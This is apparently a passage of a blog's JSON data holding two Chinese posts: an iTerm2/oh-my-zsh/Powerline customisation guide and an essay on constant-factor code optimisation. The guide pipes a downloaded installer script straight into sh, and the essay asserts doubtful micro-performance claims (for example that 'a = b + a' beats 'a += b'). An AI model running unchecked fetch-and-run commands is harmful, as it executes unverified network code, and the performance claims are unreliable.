里\n\n2）配置配色方案\n通过load presets选择刚刚安装的配色主题即可\n\n### 8. 使用agnoster主题\n1）下载agnoster主题\n到下载的工程里面运行install文件,主题将安装到`~/.oh-my-zsh/themes`目录下\n\n2）设置该主题\n进入~/.zshrc打开.zshrc文件，然后将`ZSH_THEME`后面的字段改为`agnoster`。`ZSH_THEME=\"agnoster\"`（agnoster即为要设置的主题）\n\n### 9. 增加指令高亮效果——zsh-syntax-highlighting\n指令高亮效果作用是当用户输入正确命令时指令会绿色高亮，错误时命令红色高亮\n\n1）cd到.zshrc所在目录\n\n2）执行指令将工程克隆到当前目录\n\n`git clone git://github.com/zsh-users/zsh-syntax-highlighting.git`\n\n3）打开.zshrc文件，在最后添加下面内容\n\n`source XXX/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh`\n\n保存文件。\n\n注意：xxx代表`.zshrc`所在目录\n\n4）`cd ~/.oh-my-zsh/custom/plugins`\n\n5）再次打开`.zshrc`文件，在最后面添加下面内容`plugins=(zsh-syntax-highlighting)`保存文件。\n\n**启动iTerm 2 默认使用dash改用zsh解决方法：**\n`chsh -s /bin/zsh`\n### Vim\n\n`$ cd solarized\n$ cd vim-colors-solarized/colors\n$ mkdir -p ~/.vim/colors\n$ cp solarized.vim ~/.vim/colors/\n`\n`$ vi ~/.vimrc\nsyntax enable\nset background=dark\ncolorscheme solarized`\n\n### ls\n\nMac OS X 是基于 FreeBSD 的，所以一些工具 ls, top 等都是 BSD 那一套，ls 不是 GNU ls，所以即使 Terminal/iTerm2 配置了颜色，但是在 Mac 上敲入 ls 命令也不会显示高亮，可以通过安装 coreutils 来解决（`brew install coreutils`），不过如果对 ls 颜色不挑剔的话有个简单办法就是在 .bash_profile 里输出 CLICOLOR=1：\n\n`$ vi ~/.bash_profile\nexport CLICOLOR=1`\n","source":"_posts/iTerm2-美化全过程.md","raw":"---\ntitle: iTerm2 美化全过程\ntags: 'Mac'\npermalink: iterm2-mei-hua-quan-guo-cheng\nid: 2\nupdated: '2016-08-05 21:14:29'\ndate: 2016-07-28 09:49:20\n---\n\n\n本文介绍了iTerm2的美化过程，包括安装oh my zsh，powerline，以及对vim的美化。\n# 1.首先下载 iTerm 2\n# 2.打开iTerm 2\n# 3.输入下面指令安装oh-my-zsh\n`curl -L https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh | sh`\n# 4.接下来安装Powerline\n在官网有教程，我们只需要执行官网第一条安装指令就行\n如果你的终端能够正常执行pip指令，那么直接执行下面的指令可以完成安装\n\n`pip install powerline-status`\n\n如果没有，则先执行安装pip指令\n\n`sudo easy_install pip`\n\n# 5.下载、安装库字体库\n1）将工程下载下来后cd到`install.sh`文件所在目录\n2）执行指令安装字体库\n\n执行`./install.sh`指令安装所有Powerline字体\n\n安装完成后提示所有字体均已下载到`/Users/superdanny/Library/Fonts`路径下\n`All Powerline fonts installed to /Users/superdanny/Library/Fonts`\n\n# 6. 设置iTerm 2的Regular Font 和 Non-ASCII Font\n\n安装完字体库之后，把iTerm 2的设置里的Profile中的Text 选项卡中里的Regular Font和Non-ASCII Font的字体都设置成 Powerline的字体，我这里设置的字体是12pt Meslo LG S DZ Regular for Powerline\n\n### 7. 配色方案\n1）安装配色方案\n进入刚刚下载的工程的solarized/iterm2-colors-solarized 下双击 Solarized Dark.itermcolors 和 Solarized Light.itermcolors 两个文件就可以把配置文件导入到 iTerm2 里\n\n2）配置配色方案\n通过load presets选择刚刚安装的配色主题即可\n\n### 8. 使用agnoster主题\n1）下载agnoster主题\n到下载的工程里面运行install文件,主题将安装到`~/.oh-my-zsh/themes`目录下\n\n2）设置该主题\n进入~/.zshrc打开.zshrc文件，然后将`ZSH_THEME`后面的字段改为`agnoster`。`ZSH_THEME=\"agnoster\"`（agnoster即为要设置的主题）\n\n### 9. 增加指令高亮效果——zsh-syntax-highlighting\n指令高亮效果作用是当用户输入正确命令时指令会绿色高亮，错误时命令红色高亮\n\n1）cd到.zshrc所在目录\n\n2）执行指令将工程克隆到当前目录\n\n`git clone git://github.com/zsh-users/zsh-syntax-highlighting.git`\n\n3）打开.zshrc文件，在最后添加下面内容\n\n`source XXX/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh`\n\n保存文件。\n\n注意：xxx代表`.zshrc`所在目录\n\n4）`cd ~/.oh-my-zsh/custom/plugins`\n\n5）再次打开`.zshrc`文件，在最后面添加下面内容`plugins=(zsh-syntax-highlighting)`保存文件。\n\n**启动iTerm 2 默认使用dash改用zsh解决方法：**\n`chsh -s /bin/zsh`\n### Vim\n\n`$ cd solarized\n$ cd vim-colors-solarized/colors\n$ mkdir -p ~/.vim/colors\n$ cp solarized.vim ~/.vim/colors/\n`\n`$ vi ~/.vimrc\nsyntax enable\nset background=dark\ncolorscheme solarized`\n\n### ls\n\nMac OS X 是基于 FreeBSD 的，所以一些工具 ls, top 等都是 BSD 那一套，ls 不是 GNU ls，所以即使 Terminal/iTerm2 配置了颜色，但是在 Mac 上敲入 ls 命令也不会显示高亮，可以通过安装 coreutils 来解决（`brew install coreutils`），不过如果对 ls 颜色不挑剔的话有个简单办法就是在 .bash_profile 里输出 CLICOLOR=1：\n\n`$ vi ~/.bash_profile\nexport CLICOLOR=1`\n","slug":"iterm2-mei-hua-quan-guo-cheng","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xop00205es5poop5dq0","content":"<p>本文介绍了iTerm2的美化过程，包括安装oh my zsh，powerline，以及对vim的美化。</p>\n<h1 id=\"1-首先下载-iTerm-2\"><a href=\"#1-首先下载-iTerm-2\" class=\"headerlink\" title=\"1.首先下载 iTerm 2\"></a>1.首先下载 iTerm 2</h1><h1 id=\"2-打开iTerm-2\"><a href=\"#2-打开iTerm-2\" class=\"headerlink\" title=\"2.打开iTerm 2\"></a>2.打开iTerm 2</h1><h1 id=\"3-输入下面指令安装oh-my-zsh\"><a href=\"#3-输入下面指令安装oh-my-zsh\" class=\"headerlink\" title=\"3.输入下面指令安装oh-my-zsh\"></a>3.输入下面指令安装oh-my-zsh</h1><p><code>curl -L https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh | sh</code></p>\n<h1 id=\"4-接下来安装Powerline\"><a href=\"#4-接下来安装Powerline\" class=\"headerlink\" title=\"4.接下来安装Powerline\"></a>4.接下来安装Powerline</h1><p>在官网有教程，我们只需要执行官网第一条安装指令就行<br>如果你的终端能够正常执行pip指令，那么直接执行下面的指令可以完成安装</p>\n<p><code>pip install powerline-status</code></p>\n<p>如果没有，则先执行安装pip指令</p>\n<p><code>sudo easy_install pip</code></p>\n<h1 id=\"5-下载、安装库字体库\"><a href=\"#5-下载、安装库字体库\" class=\"headerlink\" title=\"5.下载、安装库字体库\"></a>5.下载、安装库字体库</h1><p>1）将工程下载下来后cd到<code>install.sh</code>文件所在目录<br>2）执行指令安装字体库</p>\n<p>执行<code>./install.sh</code>指令安装所有Powerline字体</p>\n<p>安装完成后提示所有字体均已下载到<code>/Users/superdanny/Library/Fonts</code>路径下<br><code>All Powerline fonts installed to /Users/superdanny/Library/Fonts</code></p>\n<h1 id=\"6-设置iTerm-2的Regular-Font-和-Non-ASCII-Font\"><a href=\"#6-设置iTerm-2的Regular-Font-和-Non-ASCII-Font\" class=\"headerlink\" title=\"6. 设置iTerm 2的Regular Font 和 Non-ASCII Font\"></a>6. 设置iTerm 2的Regular Font 和 Non-ASCII Font</h1><p>安装完字体库之后，把iTerm 2的设置里的Profile中的Text 选项卡中里的Regular Font和Non-ASCII Font的字体都设置成 Powerline的字体，我这里设置的字体是12pt Meslo LG S DZ Regular for Powerline</p>\n<h3 id=\"7-配色方案\"><a href=\"#7-配色方案\" class=\"headerlink\" title=\"7. 配色方案\"></a>7. 配色方案</h3><p>1）安装配色方案<br>进入刚刚下载的工程的solarized/iterm2-colors-solarized 下双击 Solarized Dark.itermcolors 和 Solarized Light.itermcolors 两个文件就可以把配置文件导入到 iTerm2 里</p>\n<p>2）配置配色方案<br>通过load presets选择刚刚安装的配色主题即可</p>\n<h3 id=\"8-使用agnoster主题\"><a href=\"#8-使用agnoster主题\" class=\"headerlink\" title=\"8. 使用agnoster主题\"></a>8. 使用agnoster主题</h3><p>1）下载agnoster主题<br>到下载的工程里面运行install文件,主题将安装到<code>~/.oh-my-zsh/themes</code>目录下</p>\n<p>2）设置该主题<br>进入~/.zshrc打开.zshrc文件，然后将<code>ZSH_THEME</code>后面的字段改为<code>agnoster</code>。<code>ZSH_THEME=&quot;agnoster&quot;</code>（agnoster即为要设置的主题）</p>\n<h3 id=\"9-增加指令高亮效果——zsh-syntax-highlighting\"><a href=\"#9-增加指令高亮效果——zsh-syntax-highlighting\" class=\"headerlink\" title=\"9. 增加指令高亮效果——zsh-syntax-highlighting\"></a>9. 增加指令高亮效果——zsh-syntax-highlighting</h3><p>指令高亮效果作用是当用户输入正确命令时指令会绿色高亮，错误时命令红色高亮</p>\n<p>1）cd到.zshrc所在目录</p>\n<p>2）执行指令将工程克隆到当前目录</p>\n<p><code>git clone git://github.com/zsh-users/zsh-syntax-highlighting.git</code></p>\n<p>3）打开.zshrc文件，在最后添加下面内容</p>\n<p><code>source XXX/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh</code></p>\n<p>保存文件。</p>\n<p>注意：xxx代表<code>.zshrc</code>所在目录</p>\n<p>4）<code>cd ~/.oh-my-zsh/custom/plugins</code></p>\n<p>5）再次打开<code>.zshrc</code>文件，在最后面添加下面内容<code>plugins=(zsh-syntax-highlighting)</code>保存文件。</p>\n<p><strong>启动iTerm 2 默认使用dash改用zsh解决方法：</strong><br><code>chsh -s /bin/zsh</code></p>\n<h3 id=\"Vim\"><a href=\"#Vim\" class=\"headerlink\" title=\"Vim\"></a>Vim</h3><p><code>$ cd solarized\n$ cd vim-colors-solarized/colors\n$ mkdir -p ~/.vim/colors\n$ cp solarized.vim ~/.vim/colors/</code><br><code>$ vi ~/.vimrc\nsyntax enable\nset background=dark\ncolorscheme solarized</code></p>\n<h3 id=\"ls\"><a href=\"#ls\" class=\"headerlink\" title=\"ls\"></a>ls</h3><p>Mac OS X 是基于 FreeBSD 的，所以一些工具 ls, top 等都是 BSD 那一套，ls 不是 GNU ls，所以即使 Terminal/iTerm2 配置了颜色，但是在 Mac 上敲入 ls 命令也不会显示高亮，可以通过安装 coreutils 来解决（<code>brew install coreutils</code>），不过如果对 ls 颜色不挑剔的话有个简单办法就是在 .bash_profile 里输出 CLICOLOR=1：</p>\n<p><code>$ vi ~/.bash_profile\nexport CLICOLOR=1</code></p>\n","excerpt":"","more":"<p>本文介绍了iTerm2的美化过程，包括安装oh my zsh，powerline，以及对vim的美化。</p>\n<h1 id=\"1-首先下载-iTerm-2\"><a href=\"#1-首先下载-iTerm-2\" class=\"headerlink\" title=\"1.首先下载 iTerm 2\"></a>1.首先下载 iTerm 2</h1><h1 id=\"2-打开iTerm-2\"><a href=\"#2-打开iTerm-2\" class=\"headerlink\" title=\"2.打开iTerm 2\"></a>2.打开iTerm 2</h1><h1 id=\"3-输入下面指令安装oh-my-zsh\"><a href=\"#3-输入下面指令安装oh-my-zsh\" class=\"headerlink\" title=\"3.输入下面指令安装oh-my-zsh\"></a>3.输入下面指令安装oh-my-zsh</h1><p><code>curl -L https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh | sh</code></p>\n<h1 id=\"4-接下来安装Powerline\"><a href=\"#4-接下来安装Powerline\" class=\"headerlink\" title=\"4.接下来安装Powerline\"></a>4.接下来安装Powerline</h1><p>在官网有教程，我们只需要执行官网第一条安装指令就行<br>如果你的终端能够正常执行pip指令，那么直接执行下面的指令可以完成安装</p>\n<p><code>pip install powerline-status</code></p>\n<p>如果没有，则先执行安装pip指令</p>\n<p><code>sudo easy_install pip</code></p>\n<h1 id=\"5-下载、安装库字体库\"><a href=\"#5-下载、安装库字体库\" class=\"headerlink\" title=\"5.下载、安装库字体库\"></a>5.下载、安装库字体库</h1><p>1）将工程下载下来后cd到<code>install.sh</code>文件所在目录<br>2）执行指令安装字体库</p>\n<p>执行<code>./install.sh</code>指令安装所有Powerline字体</p>\n<p>安装完成后提示所有字体均已下载到<code>/Users/superdanny/Library/Fonts</code>路径下<br><code>All Powerline fonts installed to /Users/superdanny/Library/Fonts</code></p>\n<h1 id=\"6-设置iTerm-2的Regular-Font-和-Non-ASCII-Font\"><a href=\"#6-设置iTerm-2的Regular-Font-和-Non-ASCII-Font\" class=\"headerlink\" title=\"6. 设置iTerm 2的Regular Font 和 Non-ASCII Font\"></a>6. 设置iTerm 2的Regular Font 和 Non-ASCII Font</h1><p>安装完字体库之后，把iTerm 2的设置里的Profile中的Text 选项卡中里的Regular Font和Non-ASCII Font的字体都设置成 Powerline的字体，我这里设置的字体是12pt Meslo LG S DZ Regular for Powerline</p>\n<h3 id=\"7-配色方案\"><a href=\"#7-配色方案\" class=\"headerlink\" title=\"7. 配色方案\"></a>7. 配色方案</h3><p>1）安装配色方案<br>进入刚刚下载的工程的solarized/iterm2-colors-solarized 下双击 Solarized Dark.itermcolors 和 Solarized Light.itermcolors 两个文件就可以把配置文件导入到 iTerm2 里</p>\n<p>2）配置配色方案<br>通过load presets选择刚刚安装的配色主题即可</p>\n<h3 id=\"8-使用agnoster主题\"><a href=\"#8-使用agnoster主题\" class=\"headerlink\" title=\"8. 使用agnoster主题\"></a>8. 使用agnoster主题</h3><p>1）下载agnoster主题<br>到下载的工程里面运行install文件,主题将安装到<code>~/.oh-my-zsh/themes</code>目录下</p>\n<p>2）设置该主题<br>进入~/.zshrc打开.zshrc文件，然后将<code>ZSH_THEME</code>后面的字段改为<code>agnoster</code>。<code>ZSH_THEME=&quot;agnoster&quot;</code>（agnoster即为要设置的主题）</p>\n<h3 id=\"9-增加指令高亮效果——zsh-syntax-highlighting\"><a href=\"#9-增加指令高亮效果——zsh-syntax-highlighting\" class=\"headerlink\" title=\"9. 增加指令高亮效果——zsh-syntax-highlighting\"></a>9. 增加指令高亮效果——zsh-syntax-highlighting</h3><p>指令高亮效果作用是当用户输入正确命令时指令会绿色高亮，错误时命令红色高亮</p>\n<p>1）cd到.zshrc所在目录</p>\n<p>2）执行指令将工程克隆到当前目录</p>\n<p><code>git clone git://github.com/zsh-users/zsh-syntax-highlighting.git</code></p>\n<p>3）打开.zshrc文件，在最后添加下面内容</p>\n<p><code>source XXX/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh</code></p>\n<p>保存文件。</p>\n<p>注意：xxx代表<code>.zshrc</code>所在目录</p>\n<p>4）<code>cd ~/.oh-my-zsh/custom/plugins</code></p>\n<p>5）再次打开<code>.zshrc</code>文件，在最后面添加下面内容<code>plugins=(zsh-syntax-highlighting)</code>保存文件。</p>\n<p><strong>启动iTerm 2 默认使用dash改用zsh解决方法：</strong><br><code>chsh -s /bin/zsh</code></p>\n<h3 id=\"Vim\"><a href=\"#Vim\" class=\"headerlink\" title=\"Vim\"></a>Vim</h3><p><code>$ cd solarized\n$ cd vim-colors-solarized/colors\n$ mkdir -p ~/.vim/colors\n$ cp solarized.vim ~/.vim/colors/</code><br><code>$ vi ~/.vimrc\nsyntax enable\nset background=dark\ncolorscheme solarized</code></p>\n<h3 id=\"ls\"><a href=\"#ls\" class=\"headerlink\" title=\"ls\"></a>ls</h3><p>Mac OS X 是基于 FreeBSD 的，所以一些工具 ls, top 等都是 BSD 那一套，ls 不是 GNU ls，所以即使 Terminal/iTerm2 配置了颜色，但是在 Mac 上敲入 ls 命令也不会显示高亮，可以通过安装 coreutils 来解决（<code>brew install coreutils</code>），不过如果对 ls 颜色不挑剔的话有个简单办法就是在 .bash_profile 里输出 CLICOLOR=1：</p>\n<p><code>$ vi ~/.bash_profile\nexport CLICOLOR=1</code></p>\n"},{"title":"什么才是优秀的程序代码","date":"2017-02-08T17:35:13.000Z","header-img":"/content/images/githubauto/background.jpg","_content":"\n\n\n首先，我想说的是，我谈及的“优秀程序代码”，不是指“优秀程序”，也不是更易阅读的“代码”，恰恰相反，我可能想写的是更不易阅读的代码，这里的“优秀”指的是高效、快速。\n\n在写之前，我想先用一个原则引入这个文章：\n\n> **KISS原则**  **\\*K**eep **I**t **S**imple, **S**tupid* \n\n是的，这是我心中优秀的代码程序，就是简单、高效。\n\n相信所有人都知道时间复杂度这个东西，是的，优秀的代码永远都在做一件事：降低时间复杂度，哪怕写的过程是复杂的、理解起来是相对难的(比如，快速排序、堆排序)。那么，我接下来，想较一下真。\n\n# 卡常数\n\n> 据考证，[卡]（Qa'a）是古埃及第一王朝的最后一位法老。\n>\n> 他发现并研究了一种常数，后世以他的名字叫做卡常数。卡特兰数的起源也是因为卡的后人与特兰克斯结婚，生下来的孩子就叫卡特兰，而他只是发表了祖传的家书而已。\n>\n> Sereja也是卡的后人，提出括号序列问题，也是从家书里得到的资料。然而Sereja为了不让这个秘密公开，于是隐瞒了这道题的真正做法。可是由于卡的后人不是各个都像卡特兰一样爱慕虚荣，这一算法也无法找到。“欲见贤人而不以其道，犹欲其入而闭之门也”。卡之常数的奥秘，需要以一颗诚心去追寻。\n\n\n\n看不懂对吗？\n\n我也看不懂，因为这是一群高中生写的。按照我的理解，卡常数，就是内循环里的那些看似不重要的语句其实每一句话的运行速度是不一样的，这个客观规律，是真实存在的，举个栗子🌰\n\n程序1\n\n```c\nfor (int i = 0; i <= K; i++)\n  for (int j = 0; j <= K; j++)\n    for (int k = 0; k <= K; k++) { \n      r.a[i][j] += a[i][k] * x.a[k][j];\n      if (r.a[i][j] >= 1ll << 62 || k == K) r.a[i][j] %= mod;\n   }\n```\n\n程序2\n\n```C\nfor (int i = 0; i <= K; i++)\n  for (int j = 0; j <= K; j++)\n    for (int k = 0; k <= K; k++)\n      r.a[i][j] = (r. a[i][j] + a[i][k] * x.a[k][j] % mod) % mod; \n```\n\n按照常人的理解，`程序1`和`程序2`的复杂度都是O(n^3)，没错，那么他们的时间是一样的吗？\n\n并不一样。\n\n在机器性能并没有那么高的情况下，在测试数据量没有那么少的情况下，第二种比第一种快了一倍。\n\n**为什么？**\n\n因为第二种代码更加精炼吗？并不完全是。\n\n在`程序1`中，`` if (r.a[i][j] >= 1ll << 62 || k == K)``实际上是耗费时间的，if操作在执行的时候真实的操作是这样的：\n\n```c\nif(这里面是true吗？)\n  左边是true吗？\n  右边是true吗？\n  ||操作是true吗？\n```\n\n这必然会消耗大量的时间，同理\n\n```c\n r.a[i][j] += a[i][k] * x.a[k][j];\n r.a[i][j] = a[i][k] * x.a[k][j] + r.a[i][j];\n```\n\n一样吗？实际上是不一样的，后者比前者快一点。\n\n你可能觉得，这也太较真了吧？但是高效就是高效，效率提高才是硬道理。\n\n> 不积跬步，无以至千里；不积小流，无以成江海。\n\n# 原则\n\n* 一杆内存在心中\n\n* 多写一个不必要的循环递归，浑身难受\n\n* 多写一个不必要的逻辑判断，浑身难受\n\n* 多写一个无关变量，浑身难受\n\n* 不找到最优解，浑身难受\n\n* 始终自发的想着如何用栈、树去解决问题\n\n* 代码效率哪怕提升的是一倍，花一天优化代码也是值得的\n\n* 时刻遵循RP定律写代码，RP++\n\n\n我从我接触OI那一刻起，我觉得算法是美的，每一个人写出来的算法都体现了一种算法，永远对高效快速的低复杂度的精炼代码充满敬畏之心！❤️","source":"_posts/什么才是优秀的程序代码.md","raw":"---\ntitle: 什么才是优秀的程序代码\npermalink: awesome-code\ndate: 2017-02-08 17:35:13\ntags: CodeStyle\ncategories: CodeStyle\nheader-img: \"/content/images/githubauto/background.jpg\"\n---\n\n\n\n首先，我想说的是，我谈及的“优秀程序代码”，不是指“优秀程序”，也不是更易阅读的“代码”，恰恰相反，我可能想写的是更不易阅读的代码，这里的“优秀”指的是高效、快速。\n\n在写之前，我想先用一个原则引入这个文章：\n\n> **KISS原则**  **\\*K**eep **I**t **S**imple, **S**tupid* \n\n是的，这是我心中优秀的代码程序，就是简单、高效。\n\n相信所有人都知道时间复杂度这个东西，是的，优秀的代码永远都在做一件事：降低时间复杂度，哪怕写的过程是复杂的、理解起来是相对难的(比如，快速排序、堆排序)。那么，我接下来，想较一下真。\n\n# 卡常数\n\n> 据考证，[卡]（Qa'a）是古埃及第一王朝的最后一位法老。\n>\n> 他发现并研究了一种常数，后世以他的名字叫做卡常数。卡特兰数的起源也是因为卡的后人与特兰克斯结婚，生下来的孩子就叫卡特兰，而他只是发表了祖传的家书而已。\n>\n> Sereja也是卡的后人，提出括号序列问题，也是从家书里得到的资料。然而Sereja为了不让这个秘密公开，于是隐瞒了这道题的真正做法。可是由于卡的后人不是各个都像卡特兰一样爱慕虚荣，这一算法也无法找到。“欲见贤人而不以其道，犹欲其入而闭之门也”。卡之常数的奥秘，需要以一颗诚心去追寻。\n\n\n\n看不懂对吗？\n\n我也看不懂，因为这是一群高中生写的。按照我的理解，卡常数，就是内循环里的那些看似不重要的语句其实每一句话的运行速度是不一样的，这个客观规律，是真实存在的，举个栗子🌰\n\n程序1\n\n```c\nfor (int i = 0; i <= K; i++)\n  for (int j = 0; j <= K; j++)\n    for (int k = 0; k <= K; k++) { \n      r.a[i][j] += a[i][k] * x.a[k][j];\n      if (r.a[i][j] >= 1ll << 62 || k == K) r.a[i][j] %= mod;\n   }\n```\n\n程序2\n\n```C\nfor (int i = 0; i <= K; i++)\n  for (int j = 0; j <= K; j++)\n    for (int k = 0; k <= K; k++)\n      r.a[i][j] = (r. a[i][j] + a[i][k] * x.a[k][j] % mod) % mod; \n```\n\n按照常人的理解，`程序1`和`程序2`的复杂度都是O(n^3)，没错，那么他们的时间是一样的吗？\n\n并不一样。\n\n在机器性能并没有那么高的情况下，在测试数据量没有那么少的情况下，第二种比第一种快了一倍。\n\n**为什么？**\n\n因为第二种代码更加精炼吗？并不完全是。\n\n在`程序1`中，`` if (r.a[i][j] >= 1ll << 62 || k == K)``实际上是耗费时间的，if操作在执行的时候真实的操作是这样的：\n\n```c\nif(这里面是true吗？)\n  左边是true吗？\n  右边是true吗？\n  ||操作是true吗？\n```\n\n这必然会消耗大量的时间，同理\n\n```c\n r.a[i][j] += a[i][k] * x.a[k][j];\n r.a[i][j] = a[i][k] * x.a[k][j] + r.a[i][j];\n```\n\n一样吗？实际上是不一样的，后者比前者快一点。\n\n你可能觉得，这也太较真了吧？但是高效就是高效，效率提高才是硬道理。\n\n> 不积跬步，无以至千里；不积小流，无以成江海。\n\n# 原则\n\n* 一杆内存在心中\n\n* 多写一个不必要的循环递归，浑身难受\n\n* 多写一个不必要的逻辑判断，浑身难受\n\n* 多写一个无关变量，浑身难受\n\n* 不找到最优解，浑身难受\n\n* 始终自发的想着如何用栈、树去解决问题\n\n* 代码效率哪怕提升的是一倍，花一天优化代码也是值得的\n\n* 时刻遵循RP定律写代码，RP++\n\n\n我从我接触OI那一刻起，我觉得算法是美的，每一个人写出来的算法都体现了一种算法，永远对高效快速的低复杂度的精炼代码充满敬畏之心！❤️","slug":"awesome-code","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xoq00235es56c9zcbsq","content":"<p>首先，我想说的是，我谈及的“优秀程序代码”，不是指“优秀程序”，也不是更易阅读的“代码”，恰恰相反，我可能想写的是更不易阅读的代码，这里的“优秀”指的是高效、快速。</p>\n<p>在写之前，我想先用一个原则引入这个文章：</p>\n<blockquote>\n<p><strong>KISS原则</strong>  <strong>*K</strong>eep <strong>I</strong>t <strong>S</strong>imple, <strong>S</strong>tupid* </p>\n</blockquote>\n<p>是的，这是我心中优秀的代码程序，就是简单、高效。</p>\n<p>相信所有人都知道时间复杂度这个东西，是的，优秀的代码永远都在做一件事：降低时间复杂度，哪怕写的过程是复杂的、理解起来是相对难的(比如，快速排序、堆排序)。那么，我接下来，想较一下真。</p>\n<h1 id=\"卡常数\"><a href=\"#卡常数\" class=\"headerlink\" title=\"卡常数\"></a>卡常数</h1><blockquote>\n<p>据考证，[卡]（Qa’a）是古埃及第一王朝的最后一位法老。</p>\n<p>他发现并研究了一种常数，后世以他的名字叫做卡常数。卡特兰数的起源也是因为卡的后人与特兰克斯结婚，生下来的孩子就叫卡特兰，而他只是发表了祖传的家书而已。</p>\n<p>Sereja也是卡的后人，提出括号序列问题，也是从家书里得到的资料。然而Sereja为了不让这个秘密公开，于是隐瞒了这道题的真正做法。可是由于卡的后人不是各个都像卡特兰一样爱慕虚荣，这一算法也无法找到。“欲见贤人而不以其道，犹欲其入而闭之门也”。卡之常数的奥秘，需要以一颗诚心去追寻。</p>\n</blockquote>\n<p>看不懂对吗？</p>\n<p>我也看不懂，因为这是一群高中生写的。按照我的理解，卡常数，就是内循环里的那些看似不重要的语句其实每一句话的运行速度是不一样的，这个客观规律，是真实存在的，举个栗子🌰</p>\n<p>程序1</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt;= K; i++)</div><div class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt;= K; j++)</div><div class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> k = <span class=\"number\">0</span>; k &lt;= K; k++) &#123; </div><div class=\"line\">      r.a[i][j] += a[i][k] * x.a[k][j];</div><div class=\"line\">      <span class=\"keyword\">if</span> (r.a[i][j] &gt;= <span class=\"number\">1l</span>l &lt;&lt; <span class=\"number\">62</span> || k == K) r.a[i][j] %= mod;</div><div class=\"line\">   &#125;</div></pre></td></tr></table></figure>\n<p>程序2</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt;= K; i++)</div><div class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt;= K; j++)</div><div class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> k = <span class=\"number\">0</span>; k &lt;= K; k++)</div><div class=\"line\">      r.a[i][j] = (r. a[i][j] + a[i][k] * x.a[k][j] % mod) % mod;</div></pre></td></tr></table></figure>\n<p>按照常人的理解，<code>程序1</code>和<code>程序2</code>的复杂度都是O(n^3)，没错，那么他们的时间是一样的吗？</p>\n<p>并不一样。</p>\n<p>在机器性能并没有那么高的情况下，在测试数据量没有那么少的情况下，第二种比第一种快了一倍。</p>\n<p><strong>为什么？</strong></p>\n<p>因为第二种代码更加精炼吗？并不完全是。</p>\n<p>在<code>程序1</code>中，<code>if (r.a[i][j] &gt;= 1ll &lt;&lt; 62 || k == K)</code>实际上是耗费时间的，if操作在执行的时候真实的操作是这样的：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">if</span>(这里面是<span class=\"literal\">true</span>吗？)</div><div class=\"line\">  左边是<span class=\"literal\">true</span>吗？</div><div class=\"line\">  右边是<span class=\"literal\">true</span>吗？</div><div class=\"line\">  ||操作是<span class=\"literal\">true</span>吗？</div></pre></td></tr></table></figure>\n<p>这必然会消耗大量的时间，同理</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">r.a[i][j] += a[i][k] * x.a[k][j];</div><div class=\"line\">r.a[i][j] = a[i][k] * x.a[k][j] + r.a[i][j];</div></pre></td></tr></table></figure>\n<p>一样吗？实际上是不一样的，后者比前者快一点。</p>\n<p>你可能觉得，这也太较真了吧？但是高效就是高效，效率提高才是硬道理。</p>\n<blockquote>\n<p>不积跬步，无以至千里；不积小流，无以成江海。</p>\n</blockquote>\n<h1 id=\"原则\"><a href=\"#原则\" class=\"headerlink\" title=\"原则\"></a>原则</h1><ul>\n<li><p>一杆内存在心中</p>\n</li>\n<li><p>多写一个不必要的循环递归，浑身难受</p>\n</li>\n<li><p>多写一个不必要的逻辑判断，浑身难受</p>\n</li>\n<li><p>多写一个无关变量，浑身难受</p>\n</li>\n<li><p>不找到最优解，浑身难受</p>\n</li>\n<li><p>始终自发的想着如何用栈、树去解决问题</p>\n</li>\n<li><p>代码效率哪怕提升的是一倍，花一天优化代码也是值得的</p>\n</li>\n<li><p>时刻遵循RP定律写代码，RP++</p>\n</li>\n</ul>\n<p>我从我接触OI那一刻起，我觉得算法是美的，每一个人写出来的算法都体现了一种算法，永远对高效快速的低复杂度的精炼代码充满敬畏之心！❤️</p>\n","excerpt":"","more":"<p>首先，我想说的是，我谈及的“优秀程序代码”，不是指“优秀程序”，也不是更易阅读的“代码”，恰恰相反，我可能想写的是更不易阅读的代码，这里的“优秀”指的是高效、快速。</p>\n<p>在写之前，我想先用一个原则引入这个文章：</p>\n<blockquote>\n<p><strong>KISS原则</strong>  <strong>*K</strong>eep <strong>I</strong>t <strong>S</strong>imple, <strong>S</strong>tupid* </p>\n</blockquote>\n<p>是的，这是我心中优秀的代码程序，就是简单、高效。</p>\n<p>相信所有人都知道时间复杂度这个东西，是的，优秀的代码永远都在做一件事：降低时间复杂度，哪怕写的过程是复杂的、理解起来是相对难的(比如，快速排序、堆排序)。那么，我接下来，想较一下真。</p>\n<h1 id=\"卡常数\"><a href=\"#卡常数\" class=\"headerlink\" 